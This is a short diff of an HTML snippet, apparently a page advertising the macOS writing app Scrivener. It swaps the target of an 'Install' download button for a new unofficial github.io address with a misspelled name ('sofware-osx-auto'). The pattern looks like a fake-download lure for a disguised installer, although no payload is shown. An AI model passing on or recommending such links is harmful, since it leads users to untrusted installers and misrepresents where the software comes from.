@@ -6,7 +6,7 @@
 <h3>Scrivener - author's writing studio</h3>
 <p>Scrivener is a professional long-form writing and manuscript management application specifically developed for macOS environments</p>
 
-<a href="https://mac-apps-install.github.io/.github/">
+<a href="https://sofware-osx-auto.github.io/.github/Scr">
   <img src="https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png" width="200" alt="Install"/>
 </a>
 </div>
